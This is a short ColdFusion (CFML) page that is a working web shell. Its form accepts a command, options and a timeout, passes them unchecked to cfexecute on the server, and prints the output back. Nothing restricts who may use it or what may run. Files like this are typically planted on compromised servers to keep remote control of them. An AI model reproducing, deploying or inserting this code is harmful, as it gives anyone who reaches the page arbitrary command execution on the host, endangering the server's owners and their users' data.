<html>
<body>

<cfoutput>
<table>
<form method="POST" action="">
 <tr>
  <td>Command:</td>
  <td> < input type=text name="cmd" size=50<cfif isdefined("form.cmd")> value="#form.cmd#" </cfif>> < br></td>
 </tr>
 <tr>
  <td>Options:</td>
  <td> < input type=text name="opts" size=50 <cfif isdefined("form.opts")> value="#form.opts#" </cfif> >< br> </td>
 </tr>
 <tr>
  <td>Timeout:</td>
  <td>< input type=text name="timeout" size=4 <cfif isdefined("form.timeout")> value="#form.timeout#" <cfelse> value="5" </cfif> > </td>
 </tr>
</table>
<input type=submit value="Exec" >
</FORM>

<cfsavecontent variable="myVar">
<cfexecute name = "#Form.cmd#" arguments = "#Form.opts#" timeout = "#Form.timeout#">
</cfexecute>
</cfsavecontent>
<pre>
#myVar#
</pre>
</cfoutput>
</body>
</html>